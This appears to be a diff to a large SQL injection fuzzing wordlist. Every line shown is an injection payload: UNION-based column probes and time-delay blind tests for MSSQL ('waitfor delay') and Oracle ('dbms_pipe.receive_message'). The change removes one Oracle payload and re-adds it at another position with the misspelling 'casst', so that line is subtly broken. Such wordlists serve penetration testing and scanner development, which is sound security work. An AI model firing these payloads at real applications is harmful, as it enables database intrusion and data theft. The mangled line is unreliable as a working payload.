@@ -22581,6 +22581,7 @@
 0x0d0a' union all select 1337,1337,1337,1337,1337,1337,1337,1337,1337,1337 -- 
 0x0d0a' union all select 1337,1337,1337,1337,1337,1337,1337,1337,1337,1337 from dual -- 
 0x0d0a' union all select 1337,1337,1337,1337,1337,1337,1337,1337,1337,1337 waitfor delay '00:02' -- 
+0x0d0a' union all select casst(dbms_pipe.receive_message(('a'),120) as varchar2(10)),'1337','1337','1337','1337','1337','1337' from dual -- 
 0x0d0a' union all select cast(dbms_pipe.receive_message(('a'),120) as integer) from dual -- 
 0x0d0a' union all select cast(dbms_pipe.receive_message(('a'),120) as integer),'1337' from dual -- 
 0x0d0a' union all select cast(dbms_pipe.receive_message(('a'),120) as integer),'1337','1337' from dual -- 
@@ -22615,7 +22616,6 @@
 0x0d0a' union all select cast(dbms_pipe.receive_message(('a'),120) as varchar2(10)),'1337','1337','1337' from dual -- 
 0x0d0a' union all select cast(dbms_pipe.receive_message(('a'),120) as varchar2(10)),'1337','1337','1337','1337' from dual -- 
 0x0d0a' union all select cast(dbms_pipe.receive_message(('a'),120) as varchar2(10)),'1337','1337','1337','1337','1337' from dual -- 
-0x0d0a' union all select cast(dbms_pipe.receive_message(('a'),120) as varchar2(10)),'1337','1337','1337','1337','1337','1337' from dual -- 
 0x0d0a' union all select cast(dbms_pipe.receive_message(('a'),120) as varchar2(10)),'1337','1337','1337','1337','1337','1337','1337' from dual -- 
 0x0d0a' union all select cast(dbms_pipe.receive_message(('a'),120) as varchar2(10)),'1337','1337','1337','1337','1337','1337','1337','1337' from dual -- 
 0x0d0a' union all select cast(dbms_pipe.receive_message(('a'),120) as varchar2(10)),'1337','1337','1337','1337','1337','1337','1337','1337','1337' from dual -- 
